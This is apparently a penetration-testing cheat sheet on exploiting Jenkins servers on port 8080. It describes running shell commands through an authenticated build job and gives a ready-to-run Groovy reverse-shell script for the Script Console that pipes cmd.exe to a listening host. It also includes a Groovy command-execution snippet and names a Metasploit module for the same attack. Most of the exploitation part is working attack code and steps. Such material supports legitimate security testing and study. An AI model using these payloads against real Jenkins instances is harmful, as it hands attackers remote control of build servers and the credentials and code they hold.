# 8080 - Jenkins

Jenkins is a free and open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery.

## Enumeration

Jenkins run by default on port 8080

## Exploitation

### Basic command execution \(Authenticated\)

*  Press 'Create a job'
* Choose a name and  Create new freestyle project 
* In the `build` section press `Execute shell`
* Enter the command you would like \(based on OS\)
* Press 'Save'
* On the project dashboard go to `Build now`
* Press the newly created number under 'Build History'
* Press `Console houtput`
* See output of the command.
* To execute a different command press 'back to project' and then 'configure'



### Groovy Script

Jenkins features a nice Groovy script console which allows one to run arbitrary Groovy scripts within the Jenkins master runtime or in the runtime on agents.

#### Reverse Shell from the web interface

At Jenkins Dashboard go to Manage Jenkins and then select Script Console, run the following code for reverse shell:

```text
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

#### Executing commands local:

```text
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'ipconfig'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

#### Metasploit

uses the Jenkins-CI Groovy script console to execute OS commands using Java:

`use exploit/multi/http/jenkins_script_console`

\`\`

